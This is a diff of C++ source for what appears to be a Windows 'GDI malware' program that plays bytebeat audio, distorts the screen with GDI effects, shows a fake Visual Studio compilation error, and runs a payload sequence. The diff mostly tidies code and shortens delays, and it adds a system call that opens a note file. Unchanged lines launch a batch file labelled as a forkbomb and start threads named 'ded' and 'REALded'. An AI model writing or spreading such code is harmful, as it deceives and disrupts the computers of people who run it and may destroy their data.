@@ -178,60 +178,6 @@ void WINAPI Bytebeat5() {
 	waveOutClose(wave);
 }
 
-/*void WINAPI BytebeatPato4() {
-	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };
-
-	waveOutOpen(&wave, 0, &wavef, 0, 0, 0);
-	char buffer[8000 * 60];
-
-	for (DWORD t = 0; t < sizeof(buffer); t++) {
-		buffer[t] = (t*(-t>>(t>>13)%8+2&(t>>12)%256)/4+(1048576/(t%65536)&128));
-	}
-
-	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
-
-	waveOutPrepareHeader(wave, &header, sizeof(WAVEHDR));
-	waveOutWrite(wave, &header, sizeof(WAVEHDR));
-	waveOutUnprepareHeader(wave, &header, sizeof(WAVEHDR));
-	waveOutClose(wave);
-}*/
-
-/*void WINAPI BytebeatPato5() {
-	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };
-
-	waveOutOpen(&wave, 0, &wavef, 0, 0, 0);
-	char buffer[8000 * 60];
-
-	for (DWORD t = 0; t < sizeof(buffer); t++) {
-		buffer[t] = ((((t*(t&16384?7:5)*(3-(3&t>>9)+(3&t>>(-t>>20&1?8:11)))>>(3&-t>>(t&(-t&57344?4096:6144)?2:16))|(-t&24576?(3*t>>5)%192:(t>>4)%192)|(t>>20&1?t>>4:t>>(-t>>18&1)+2))&255)>>1)-(t>>18&1?((-t>>1)*(t&16384?7:5)>>(-t>>10&3)&t>>4&255)>>1:(-t>>2)*(t&16384?7:5)>>(-t>>10&3)&(t>>4&255)>>1)+(128&(int)(4E4/(1+(t&(-t&28672?4095:2047)))))+(t>>18&3&&-(t*(t^t%9)&255&-(t>>(t>>11&31?(-t&14336?5:4)-!(-t&28672)-!(-t&122880):6))<<2&255)>>2)+128);
-	}
-
-	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
-
-	waveOutPrepareHeader(wave, &header, sizeof(WAVEHDR));
-	waveOutWrite(wave, &header, sizeof(WAVEHDR));
-	waveOutUnprepareHeader(wave, &header, sizeof(WAVEHDR));
-	waveOutClose(wave);
-}*/
-
-/*void WINAPI BytebeatPato6() {
-	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };
-
-	waveOutOpen(&wave, 0, &wavef, 0, 0, 0);
-	char buffer[8000 * 60];
-
-	for (DWORD t = 0; t < sizeof(buffer); t++) {
-		buffer[t] = (((2*t>>11&t>>13)%11%9%7*t>>1&127)+(((t>>11)+2&3?0:1)*(-t>>4&127)*((t>>2^-(t&t>>2))*t&255)>>8)+(5000/(t%2048?t%2048:1)*(-t>>12&7?-t>>11&1:1)&128));
-	}
-
-	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
-
-	waveOutPrepareHeader(wave, &header, sizeof(WAVEHDR));
-	waveOutWrite(wave, &header, sizeof(WAVEHDR));
-	waveOutUnprepareHeader(wave, &header, sizeof(WAVEHDR));
-	waveOutClose(wave);
-}*/
-
 // Add this function near the top of your file, after the includes
 std::wstring getRandomImageFile() {
     const std::array<std::wstring, 4> imageFiles = {
@@ -459,9 +405,8 @@ DWORD WINAPI fun4(LPVOID lpVoid) // https://github.com/pankoza2-pl/GDI-and-Byteb
     //return 0x00;
 }
 
-/// @brief ///////////////////////////////////////////////////////////////////
-/// @param lpstart 
-/// @return /
+/////////////////////////////////////////////////////////////////////////////////
+
 DWORD WINAPI FakeError(LPVOID lpstart) {
 		MessageBoxA(0, "IndexError: list assignment index out of range", "Visual Studio Community 2017: Compilation Error!",  MB_ABORTRETRYIGNORE | MB_ICONERROR);
 	return 0x00;
@@ -485,14 +430,6 @@ DWORD WINAPI Dark(LPVOID lpstart) {
 	while (true) {
 		for (int ys = 0; ys < y; ys += 12) {
 			StretchBlt(hdc, 0, 0, x, ys, hdc, 0, 0, 1, 1, SRCAND);
-
-			/*if (rand() % 5 == 0) { DrawIcon(hdc, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
-			if (rand() % 5 == 0) { DrawIcon(hdc, x, y, LoadIcon(0, IDI_WARNING)); Sleep(0.99); }
-			if (rand() % 5 == 0) { DrawIcon(hdc, x, y, LoadIcon(0, IDI_INFORMATION)); Sleep(0.99); }
-			if (rand() % 5 == 0) { DrawIcon(hdc, x, y, LoadIcon(0, IDI_INFORMATION)); Sleep(0.99); }
-			if (rand() % 5 == 0) { DrawIcon(hdc, x, y, LoadIcon(0, IDI_ASTERISK)); Sleep(0.99); }
-			*/
-		//Sleep(1);
 		}
 	}
 }
@@ -590,51 +527,22 @@ DWORD WINAPI RGBCircle(LPVOID lpstart) {
 	int color = 0;
 
 	while (true) {
-		if (color == 1) {
-			circle = CreateSolidBrush(RGB(random() % 255, random() % 165, 0));
-		}
-		else if (color == 2) {
-			circle = CreateSolidBrush(RGB(random() % 255, random() % 255, 0));
-		}
-		else if (color == 3) {
-			circle = CreateSolidBrush(RGB(0, random() % 255, 0));
-		}
-		else if (color == 4) {
-			circle = CreateSolidBrush(RGB(0, random() % 255, random() % 255));
-		}
-		else if (color == 5) {
-			circle = CreateSolidBrush(RGB(0, 0, random() % 255));
-		}
-		else if (color == 6) {
-			circle = CreateSolidBrush(RGB(random() % 148, 0, random() % 211));
-		}
-		else if (color == 7) {
-			circle = CreateSolidBrush(RGB(random() % 255, 0, random() % 255));
-		}
-		else if (color == 8) {
-			circle = CreateSolidBrush(RGB(random() % 255, 0, 0));
-			color = 0;
-		}
+		if (color == 1) {circle = CreateSolidBrush(RGB(random() % 255, random() % 165, 0));}
+		else if (color == 2) {circle = CreateSolidBrush(RGB(random() % 255, random() % 255, 0));}
+		else if (color == 3) {circle = CreateSolidBrush(RGB(0, random() % 255, 0));}
+		else if (color == 4) {circle = CreateSolidBrush(RGB(0, random() % 255, random() % 255));}
+		else if (color == 5) {circle = CreateSolidBrush(RGB(0, 0, random() % 255));}
+		else if (color == 6) {circle = CreateSolidBrush(RGB(random() % 148, 0, random() % 211));}
+		else if (color == 7) {circle = CreateSolidBrush(RGB(random() % 255, 0, random() % 255));}
+		else if (color == 8) {circle = CreateSolidBrush(RGB(random() % 255, 0, 0));color = 0;}
 
 		SelectObject(hdc, circle);
 		SelectObject(hdc, border);
 		
-		if (xs >= x) {
-			xs = random() % x;
-			ys = random() % y;
-		}
-		else if (ys >= y) {
-			xs = random() % x;
-			ys = random() % y;
-		}
-		else if (xs <= 0) {
-			xs = random() % x;
-			ys = random() % y;
-		}
-		else if (ys <= 0) {
-			xs = random() % x;
-			ys = random() % y;
-		}
+		if (xs >= x) {xs = random() % x;ys = random() % y;}
+		else if (ys >= y) {xs = random() % x;ys = random() % y;}
+		else if (xs <= 0) {xs = random() % x;ys = random() % y;}
+		else if (ys <= 0) {xs = random() % x;ys = random() % y;}
 
 		//int sel = random() % 4 + 1;
 
@@ -782,25 +690,25 @@ DWORD WINAPI Melter(LPVOID lpstart) {
 		if (sel == 1) {
 			for (int i = 0; i < rnd; i += 10) {
 				BitBlt(hdc, xs + i, ys + i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);
-				Sleep(10);
+				Sleep(1);
 			}
 		}
 		else if (sel == 2) {
 			for (int i = 0; i < rnd; i += 10) {
 				BitBlt(hdc, xs + i, ys - i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);
-				Sleep(10);
+				Sleep(1);
 			}
 		}
 		else if (sel == 3) {
 			for (int i = 0; i < rnd; i += 10) {
 				BitBlt(hdc, xs - i, ys + i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);
-				Sleep(10);
+				Sleep(1);
 			}
 		}
 		else if (sel == 4) {
 			for (int i = 0; i < rnd; i += 10) {
 				BitBlt(hdc, xs - i, ys - i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);
-				Sleep(10);
+				Sleep(1);
 			}
 		}
 	}
@@ -2180,6 +2088,7 @@ void startPayloads() {
     Sleep(random() % 500 + 340);
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
     // thanks tabnine
+    system("note.txt");
 
 	Sleep(random() % 5000 + 3400);
 	HANDLE dark = CreateThread(0, 0, Dark, 0, 0, &ID);
@@ -2329,7 +2238,7 @@ void startPayloads() {
     Reset(); // stop bytebeat/""malware" music"
     RipBozo();
     system("LOL.html"); // HTML/JS code :000000
-    
+
     mciSendString(L"play finale.mp3", NULL, 0, NULL);
     system("FORK.bat"); // (forkbomb, %0|%0)
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
